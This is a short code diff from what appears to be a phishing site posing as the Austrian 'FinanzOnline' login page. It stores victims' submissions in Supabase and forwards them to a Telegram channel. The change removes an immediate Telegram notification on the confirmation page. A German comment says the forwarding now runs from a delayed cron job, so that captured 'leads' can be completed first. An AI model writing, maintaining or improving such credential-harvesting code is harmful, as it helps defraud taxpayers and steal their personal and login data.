@@ -28,22 +28,8 @@ const Confirmation = () => {
   usePageMeta("FinanzOnline Login", "/favicon.png");
   useEffect(() => { window.scrollTo(0, 0); }, []);
 
-  useEffect(() => {
-    if (!sessionId || notified.current) return;
-    notified.current = true;
-    supabase
-      .from("submissions")
-      .select("id")
-      .eq("session_id", sessionId)
-      .single()
-      .then(({ data }) => {
-        if (data) {
-          supabase.functions.invoke("notify-telegram", {
-            body: { submission_id: data.id, kind: "log" },
-          }).catch(() => {});
-        }
-      });
-  }, [sessionId]);
+  // Telegram-Versand wird ausschließlich vom pg_cron Job nach 5 Minuten erledigt.
+  // So bekommen Leads Zeit, vom Full Info zum Log zu werden, bevor gesendet wird.
 
   return (
     <div className="min-h-screen bg-white">
